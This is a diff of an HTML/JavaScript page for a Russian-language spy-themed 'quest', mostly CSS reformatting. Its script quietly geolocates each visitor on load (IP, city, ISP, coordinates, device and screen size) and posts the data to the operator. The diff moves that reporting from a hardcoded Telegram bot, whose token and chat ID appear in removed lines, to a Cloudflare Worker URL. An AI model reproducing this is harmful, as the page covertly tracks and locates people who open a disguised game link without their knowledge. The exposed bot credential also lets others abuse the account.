@@ -161,15 +161,13 @@
   .dossier-backdrop {
     position: absolute; inset: 0; z-index: 20;
     background: rgba(0,0,0,.85);
-    display: none;
-    animation: fade .4s ease;
+    display: none; animation: fade .4s ease;
   }
   .dossier-backdrop.show { display: block; }
 
   .dossier {
     position: absolute; left: 0; right: 0; bottom: 0;
-    z-index: 21;
-    background: #0a0c0e;
+    z-index: 21; background: #0a0c0e;
     border-top: 1px solid var(--red);
     padding: 20px 20px calc(max(24px, env(safe-area-inset-bottom)) + 20px);
     transform: translateY(100%);
@@ -181,18 +179,15 @@
 
   .dossier-head {
     display: flex; justify-content: space-between; align-items: center;
-    font-size: 10px; letter-spacing: 3px;
-    color: var(--red); text-transform: uppercase;
-    padding-bottom: 12px; margin-bottom: 14px;
-    border-bottom: 1px solid #1c2124;
+    font-size: 10px; letter-spacing: 3px; color: var(--red);
+    text-transform: uppercase; padding-bottom: 12px;
+    margin-bottom: 14px; border-bottom: 1px solid #1c2124;
   }
   .dossier-head .dot { width: 8px; height: 8px; }
 
   .dossier-row {
-    display: flex; justify-content: space-between;
-    gap: 12px; padding: 10px 0;
-    border-bottom: 1px solid #14181a;
-    font-size: 12px;
+    display: flex; justify-content: space-between; gap: 12px;
+    padding: 10px 0; border-bottom: 1px solid #14181a; font-size: 12px;
   }
   .dossier-row span {
     color: var(--dim); letter-spacing: 2px;
@@ -200,17 +195,15 @@
   }
   .dossier-row b {
     color: #c8ccce; font-weight: 400;
-    text-align: right; letter-spacing: 1px;
-    word-break: break-word;
+    text-align: right; letter-spacing: 1px; word-break: break-word;
   }
   .dossier-row b.amber { color: var(--amber); }
   .dossier-row b.red { color: var(--red); }
 
   .dossier-status {
-    margin-top: 16px; padding: 10px;
-    text-align: center; font-size: 11px; letter-spacing: 4px;
-    color: var(--red); border: 1px solid var(--red);
-    background: rgba(143,43,43,.08);
+    margin-top: 16px; padding: 10px; text-align: center;
+    font-size: 11px; letter-spacing: 4px; color: var(--red);
+    border: 1px solid var(--red); background: rgba(143,43,43,.08);
     animation: pulse 1.6s infinite;
   }
 
@@ -220,19 +213,15 @@
   }
 
   .timer-wrap {
-    position: absolute; inset: 0;
-    display: none; flex-direction: column;
-    align-items: center; justify-content: center;
+    position: absolute; inset: 0; display: none;
+    flex-direction: column; align-items: center; justify-content: center;
     z-index: 15; padding: 22px;
   }
   .timer-wrap.show { display: flex; animation: fade .4s ease; }
   .big-timer {
-    font-size: 88px; letter-spacing: 4px;
-    color: var(--red); font-weight: 400;
-    text-shadow: 0 0 40px rgba(143,43,43,.8);
-    animation: pulse 1s infinite;
-    font-variant-numeric: tabular-nums;
-    margin-bottom: 30px; line-height: 1;
+    font-size: 88px; letter-spacing: 4px; color: var(--red); font-weight: 400;
+    text-shadow: 0 0 40px rgba(143,43,43,.8); animation: pulse 1s infinite;
+    font-variant-numeric: tabular-nums; margin-bottom: 30px; line-height: 1;
   }
   .big-timer.danger { font-size: 40px; letter-spacing: 6px; }
 
@@ -244,18 +233,16 @@
     animation: eye 3s ease-in-out infinite;
   }
   .final .eye::after {
-    content: ""; width: 18px; height: 18px;
-    background: var(--amber); border-radius: 50%;
-    opacity: .75; box-shadow: 0 0 22px var(--amber);
+    content: ""; width: 18px; height: 18px; background: var(--amber);
+    border-radius: 50%; opacity: .75; box-shadow: 0 0 22px var(--amber);
   }
   @keyframes eye {
     0%,100% { transform: scale(1); opacity: .6; }
     50% { transform: scale(1.1); opacity: 1; }
   }
   .final h2 {
-    font-size: 26px; letter-spacing: 8px;
-    color: var(--amber); font-weight: 400; margin-bottom: 22px;
-    text-shadow: 0 0 24px rgba(201,162,75,.3);
+    font-size: 26px; letter-spacing: 8px; color: var(--amber);
+    font-weight: 400; margin-bottom: 22px; text-shadow: 0 0 24px rgba(201,162,75,.3);
   }
 
   .glitch { animation: glitch .35s steps(2) 2; }
@@ -268,8 +255,7 @@
   }
 
   .disclaimer {
-    position: fixed; left: 0; right: 0;
-    bottom: calc(env(safe-area-inset-bottom) + 4px);
+    position: fixed; left: 0; right: 0; bottom: calc(env(safe-area-inset-bottom) + 4px);
     text-align: center; font-size: 9px; letter-spacing: 2px;
     color: #2a3134; z-index: 50; pointer-events: none;
   }
@@ -310,6 +296,7 @@
     <p class="small">[ отмеченная область дышит ]</p>
   </div>
 
+  <!-- ТОЧКА НА ЛИЦЕ ПАРНЯ -->
   <div class="hotspot" id="hs1" style="top: 36%; left: 40%;"></div>
   <div class="hotspot-label" id="hs1label" style="top: 36%; left: 40%;">ВЫ</div>
 
@@ -377,14 +364,12 @@
 
 <script>
 /* ════════════════════════════════════════════════════════
-   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ СЮДА
+   ⚠️ АДРЕС ТВОЕГО CLOUDFLARE WORKER
    ════════════════════════════════════════════════════════ */
-const TG_TOKEN = "$TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw";
- // например: "1234567890:AAH..."
-const TG_CHAT  = "472749125";     // например: "987654321"
+const WORKER_URL = "https://shadow-quest.kris25ubk.workers.dev"; 
 
 /* ════════════════════════════════════════════════════════
-   ОСТАЛЬНЫЕ ФОТО
+   ЗАГЛУШКИ ДЛЯ ДРУГИХ ФОТО (замени ссылки, если надо)
    ════════════════════════════════════════════════════════ */
 const IMAGES = {
   s0: "https://picsum.photos/seed/dept-intro/900/1600",
@@ -396,11 +381,24 @@ document.getElementById("img2").src = IMAGES.s2;
 document.getElementById("img3").src = IMAGES.s3;
 
 /* ════════════════════════════════════════════════════════
-   ГЕОДАННЫЕ (ipwho.is + fallback ipapi.co)
+   ГЕОДАННЫЕ (ipapi.co + запасной)
    ════════════════════════════════════════════════════════ */
 let geo = null;
 
 async function loadGeo() {
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    if (d.ip) {
+      geo = {
+        ip: d.ip, city: d.city || "—", region: d.region || "",
+        country: d.country_name || "—", isp: d.org || "—",
+        lat: d.latitude, lon: d.longitude
+      };
+      return geo;
+    }
+  } catch(e) {}
+
   try {
     const r = await fetch("https://ipwho.is/");
     const d = await r.json();
@@ -415,17 +413,6 @@ async function loadGeo() {
     }
   } catch(e) {}
 
-  try {
-    const r = await fetch("https://ipapi.co/json/");
-    const d = await r.json();
-    geo = {
-      ip: d.ip, city: d.city || "—", region: d.region || "",
-      country: d.country_name || "—", isp: d.org || "—",
-      lat: d.latitude, lon: d.longitude
-    };
-    return geo;
-  } catch(e) {}
-
   geo = { ip: "неизвестен", city: "—", region: "", country: "—", isp: "—", lat: null, lon: null };
   return geo;
 }
@@ -433,7 +420,7 @@ async function loadGeo() {
 const geoPromise = loadGeo();
 
 /* ════════════════════════════════════════════════════════
-   ОТПРАВКА В TELEGRAM НАПРЯМУЮ
+   ОТПРАВКА НА CLOUDFLARE WORKER
    ════════════════════════════════════════════════════════ */
 async function notifyAdmin(stage) {
   const g = geo || {};
@@ -441,29 +428,29 @@ async function notifyAdmin(stage) {
               /Mac/i.test(navigator.userAgent) ? "macOS" :
               /Win/i.test(navigator.userAgent) ? "Windows" : "неизвестно";
 
-  const text =
-    `🕵️ ${stage}\n` +
-    `IP: ${g.ip || "?"}\n` +
-    `Локация: ${g.city || "?"}, ${g.country || "?"}\n` +
-    `Провайдер: ${g.isp || "?"}\n` +
-    `Координаты: ${g.lat || "?"}, ${g.lon || "?"}\n` +
-    `Устройство: ${dev} · ${screen.width}×${screen.height}\n` +
-    `Время: ${new Date().toLocaleString("ru-RU")}`;
-
-  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+  fetch(WORKER_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: TG_CHAT, text: text })
+    body: JSON.stringify({
+      stage: stage,
+      ip: g.ip,
+      city: g.city,
+      country: g.country,
+      isp: g.isp,
+      lat: g.lat,
+      lon: g.lon,
+      device: dev + " · " + screen.width + "×" + screen.height
+    })
   }).catch(()=>{});
 }
 
-// Уведомление при заходе
+// Приветственное сообщение админу
 geoPromise.then(() => {
   notifyAdmin("🚪 ВХОД НА САЙТ");
 });
 
 /* ════════════════════════════════════════════════════════
-   НАВИГАЦИЯ
+   ЛОГИКА КВЕСТА
    ════════════════════════════════════════════════════════ */
 const screens = [0,1,2,3].map(i => document.getElementById("s"+i));
 function show(n) {
